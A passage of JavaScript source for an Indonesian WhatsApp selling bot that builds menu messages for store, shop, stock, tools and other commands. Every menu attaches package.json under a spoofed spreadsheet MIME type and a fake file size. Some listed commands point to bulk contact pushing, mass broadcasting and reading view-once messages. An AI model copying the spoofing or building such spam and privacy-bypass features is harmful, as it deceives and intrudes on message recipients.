    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Storemenu\`
  • .addrespon
  • .delrespon
  • .listrespon
  • .done
  • .proses
  • .jpm (Teks)
  • .jpm2 (Foto)
  • .jpm3 (Video)
  • .jpmtesti
  • .jpmslide
  • .jpmslideht
  • .sendtesti
  • .jpmch (Teks)
  • .jpmch2 (Foto)
  • .jpmch3 (Timer)
  • .addid (Channel)
  • .delid (Channel)
  • .listid (Channel)
  • .pushkontak
  • .pushkontak2
  • .pushkontaklist
  • .push-vbutton
  • .payment
  • .produk
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'downloadmenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Downloadmenu\`
  • .tiktok
  • .tiktokmp3
  • .facebook
  • .capcut
  • .instagram
  • .ytmp3
  • .ytmp4
  • .play
  • .playvid
  • .gitclone
  • .mediafire
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'layanan': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });

let teks = `✨ *Haii @${m.sender.split("@")[0]},* ✨
Perkenalkan, saya adalah *🤖 ${global.botname2}*.

🚀 *Keunggulan Layanan CS Kami:*  
✅ *Cepat & Responsif* – ⚡ Waktu tanggapan yang optimal untuk kepuasan pelanggan.  
✅ *Profesional & Ramah* – 💬 Pelayanan dilakukan dengan etika komunikasi yang baik.  
✅ *Solusi yang Efektif* – 🔧 Penyelesaian masalah secara tepat dan efisien.  
✅ *Dukungan Berkelanjutan* – 🛠️ Pelanggan dapat terus memperoleh bantuan kapan pun diperlukan.  

🛠️ *\`▧ I N F O R M A T I O N\`*  
📌 *Botname:* ${global.botname2}  
📌 *Version:* ${global.versi}  
📌 *Mode:* ${conn.public ? "🌍 Public" : "🔒 Self"}  
📌 *Creator:* 🛡️ @${global.owner}  
📌 *Waktu:* ⏳ ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}  
📌 *Uptime VPS:* ⏱️ ${runtime(os.uptime())}  
📌 *Total Fitur:* 🎛️ ${totalFitur()}  

👑 *Your Status:* (${isCreator ? "👑 Ownerbot" : isPremium ? "💎 Reseller Panel" : isSeller ? "🔥 Premium Pengguna" : "🆓 Free User"})  

🌟 *\`▧ Layanan Kami\`* 🌟  
💰 • .sewa – ✨🚀 Sewa layanan eksklusif & premium
🛒 • .shop – 🏪🛍️ Belanja produk digital terbaik & terpercaya
💳 • .deposit – 🔄💎 Isi saldo dengan cepat & mudah
🛍️ • .cekshop – 🔍📦 Cek stok produk terbaru & terupdate
🤖 • .sewabot – 🤖⚡ Sewa bot otomatis premium & canggih
🔧 • .buyjasainstall – 🛠️⚙️ Layanan install profesional tanpa ribet
🎨 • .buyjasathema – 🎭✨ Desain tema premium & eksklusif
🔄 • .buyjasaresetpwvps – 🔁🔐 Reset password VPS instan & aman
🌐 • .buysubdo – ⚡🌍 Subdomain murah, cepat & handal
🔑 • .buytokeninstallpanel – 🔥🔑 Token install panel terbaik & termurah
📡 • .buyjasasharech – 📡📲 Jasa share channel eksklusif
📡 • .buyjasasharechv2 – 📡🚀 Versi upgrade share channel terbaik
📡 • .buyjasasharerelaych – 📡🔄 Share relay channel berkualitas tinggi
📞 • .buynokos – 📲🆕 Nomor kosong siap pakai tanpa ribet
🔑 • .buyakses – 🔓👑 Akses VIP eksklusif & premium
🖥️ • .buyownpnl – 🏢🖥️ Panel pribadi premium dengan fitur lengkap
📊 • .buyptpnl – 📈🏦 Panel PT berkualitas tinggi & terpercaya
📱 • .isipulsa – ⚡📶 Isi pulsa semua operator dengan harga terbaik
💸 • .topup-dana – 💵💙 Top-up Dana instan & terpercaya
💰 • .topup-ovo – 🟣💜 OVO saldo langsung masuk tanpa delay
🏦 • .topup-gopay – 🟢💚 GoPay top-up kilat & aman
🛍️ • .topup-shopeepay – 🧡💳 ShopeePay ready dalam hitungan detik
`;

await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname} 🚀`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: '💬 Hubungi Developer' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `🚀 ${botname} - ${versi}`,
      body: `📍 Runtime : ⏳ ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
});
}
break;

case 'shopmenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Shopmenu\`
  • .sewa 
  • .shop
  • .deposit
  • .cekshop
  • .sewabot
  • .buyjasainstall
  • .buyjasathema
  • .buysubdo
  • .buyakses
  • .buyownpnl
  • .buyptpnl
  • .isipulsa
  • .topup-dana
  • .topup-ovo
  • .topup-gopay
  • .topup-shopepay 
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'stockmenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Stockmenu\`
  • .addstockdo
  • .delstockdo
  • .checkstockdo
  • .editstockdo
  • .liststockdo
  • .buystockdo
  • .stockdo
  • .addstock
  • .delstock
  • .checkstock
  • .editstock
  • .liststock
  • .buystock
  • .stock
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'produkmenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Produkmenu\`
  • .addproduk
  • .delproduk
  • .checkproduk
  • .editproduk
  • .listproduk
  • .buyproduk
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'otomatismenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Otomatismenu\`
  • .addsaldo(tnpa gateway)
  • .minsaldo(tnpa gateway)
  • .ceksaldo(tnpa gateway)
  • .buyown(tnpa gateway)
  • .buysell(tnpa gateway)
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'toolsmenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Toolsmenu\`
  • .ai
  • .gpt
  • .tourl
  • .tourl2
  • .ssweb
  • .translate
  • .tohd
  • .shortlink
  • .shortlink2
  • .enc
  • .enchard
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'searchmenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Searchmenu\`
  • .yts
  • .apkmod
  • .pinterest
  • .gimage  
  • .sfile
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'othermenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Othermenu\`
  • .cekidch
  • .cekidgc
  • .qc
  • .brat
  • .bratvid
  • .readviewonce
  • .stickerwm
  • .sticker
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'catatatmenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Catatatmenu\`
  • .addpendapatan
  • .delpendapatan
  • .resetpendapatan
  • .resethutang
  • .addhutang
  • .delhutang
  • .listhutang
  • .resetdp
  • .adddp
  • .deldp
  • .listdp
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'newmenu': {
